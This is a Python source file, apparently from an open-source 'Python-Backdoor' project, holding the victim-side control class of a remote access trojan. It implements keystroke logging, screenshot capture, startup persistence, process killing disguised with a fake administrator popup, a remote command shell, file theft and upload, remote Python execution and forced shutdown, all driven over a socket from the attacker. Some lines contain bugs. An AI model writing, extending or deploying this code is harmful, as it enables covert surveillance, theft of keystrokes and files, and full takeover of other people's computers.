"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""

import ctypes
import subprocess
import threading
from io import BytesIO, StringIO

import pyscreeze

from src import helper, errors
from src.client import persistence
from src.defs import *
from src.client.keylogger import Keylogger


def disable_process(process):
    subprocess.Popen(["taskkill", "/f", "/im", process], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                     stdin=subprocess.PIPE, shell=True)

    persistence.vbs_block_process(process,
                                  popup=[f"{process} has been disabled by your administrator", process, "3", "16"])


def message_box(message, title="Message"):
    threading.Thread(target=ctypes.windll.user32.MessageBoxA(0, message, title, 0x0 | 0x40)).start()


def lock():
    ctypes.windll.user32.LockWorkStation()


class Control:
    def __init__(self, socket):
        self.socket = socket
        self.logger = Keylogger()

    def add_startup(self, remove=False):
        try:
            if remove:
                persistence.remove_from_startup()
            else:
                persistence.add_startup()

            self.socket.send_json(SUCCESS)
        except Exception as e:
            self.socket.send_json(ERROR, str(e))

    def close(self):
        self.socket.close()

    def keylogger_dump(self):
        try:
            self.socket.sendall_json(SUCCESS, helper.decode(self.logger.dump_logs().encode()))
        except errors.ClientSocket.KeyloggerError as e:
            self.socket.send_json(ERROR, str(e))

    def keylogger_start(self):
        self.logger.start()

    def keylogger_stop(self):
        try:
            self.logger.stop()
            self.socket.send_json(SUCCESS)
        except errors.ClientSocket.KeyloggerError as e:
            self.socket.send_json(ERROR, str(e))

    def screenshot(self):
        image = pyscreeze.screenshot()
        with BytesIO() as _bytes:
            image.save(_bytes, format="PNG")

        self.socket.sendall_json(SERVER_SCREENSHOT, image.getvalue(), is_bytes=True)

    def shutdown(self, shutdown_type, timeout):
        command = f"shutdown {shutdown_type} -f -t {str(timeout)}"
        subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                         shell=True)
        self.socket.close()
        sys.exit(0)

    def run_command(self, command):
        _command = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                    shell=True)
        output = _command.stdout.read() + _command.stderr.read()

        self.socket.sendall_json(SUCCESS, helper.decode(output))

    def command_shell(self):
        current_dir = os.getcwd()

        self.socket.send_json(SERVER_SHELL_DIR, current_dir)

        while True:
            data = self.socket.recv_json()

            if data["key"] == CLIENT_SHELL_CMD:
                command_request = data["value"]

                if command_request[:2].lower() == "cd" or command_request[:5].lower() == "chdir":
                    command = subprocess.Popen(f"{command_request} & cd", stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE, shell=True)

                    if command.stderr.read().decode() == "":  # if there is no error
                        output = (command.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                        os.chdir(output)  # change directory

                        self.socket.send_json(SERVER_SHELL_DIR, os.getcwd())
                else:
                    command = subprocess.Popen(command_request, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE,
                                               shell=True)
                    output = command.stdout.read() + command.stderr.read()

                    self.socket.sendall_json(SERVER_COMMAND_RSP, helper.decode(output))

            elif data["key"] == CLIENT_SHELL_LEAVE:
                os.chdir(current_dir)  # change directory back to original
                break

    def upload(self, buffer):
        output = self.socket.recvall(buffer)

        try:
            with open(output, "wb") as file:
                file.write(output)
            self.socket.send_json(SUCCESS)
        except Exception as e:
            self.socket.send_json(ERROR, f"Could not open file {e}")

    def receive(self, file):
        try:
            with open(file, "rb") as _file:
                data = _file.read()

            self.socket.sendall_json(SERVER_FILE_RECV, data, is_bytes=True)
        except Exception as e:
            self.socket.send_json(ERROR, f"Error reading file {e}")

    def python_interpreter(self):
        while True:
            command = self.socket.recv_json()

            if command["key"] == CLIENT_PYTHON_INTERPRETER_CMD:
                old_stdout = sys.stdout
                redirected_output = sys.stdout = StringIO()

                try:
                    exec(command)
                    print()
                    error = None
                except Exception as e:
                    error = f"{e.__class__.__name__}: "
                    try:
                        error += f"{e.args[0]}"
                    except:
                        pass
                finally:
                    sys.stdout = old_stdout

                if error:
                    self.socket.sendall_json(SERVER_PYTHON_INTERPRETER_RSP, helper.decode(error.encode()))
                else:
                    self.socket.sendall_json(SERVER_PYTHON_INTERPRETER_RSP,
                                             helper.decode(redirected_output.getvalue().encode()))
            elif command["key"] == CLIENT_PYTHON_INTERPRETER_LEAVE:
                break
